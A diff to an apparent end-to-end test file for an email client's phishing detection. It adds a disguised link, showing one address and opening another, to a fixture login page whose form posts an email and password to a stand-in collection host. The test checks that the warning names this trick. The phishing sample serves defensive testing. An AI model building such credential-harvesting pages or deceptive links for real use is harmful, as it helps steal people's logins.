@@ -90,7 +90,7 @@ const confirmDialog = (page: Page, name: string | RegExp) => page.getByRole("ale
 const loginPage: InboundAttachment = {
 	filename: "statement.html",
 	contentType: "text/html; charset=utf-8",
-	content: `<html><body><p>Sign in to view your statement</p><form action="https://collect.phish.test/post" method="post"><input type="email" name="user"><input type="password" name="pass"><button>View</button></form></body></html>`,
+	content: `<html><body><p>Sign in to view your statement</p><a href="https://collect.phish.test/">https://accounts.good.test/</a><form action="https://collect.phish.test/post" method="post"><input type="email" name="user"><input type="password" name="pass"><button>View</button></form></body></html>`,
 };
 
 test("an attached login page gets a warning whose Report phishing moves the mail to Spam and blocks the sender", async ({
@@ -119,6 +119,9 @@ test("an attached login page gets a warning whose Report phishing moves the mail
 		const block = page.locator('[data-suggestion-block="phishing"]');
 		await expect(block.locator("[data-phishing-reasons]")).toContainText(
 			"An attached web page asks for a password or sends what you type to a website.",
+		);
+		await expect(block.locator("[data-phishing-reasons]")).toContainText(
+			"A link shows one web address but opens a different one.",
 		);
 
 		// Cancelling the confirmation changes nothing.
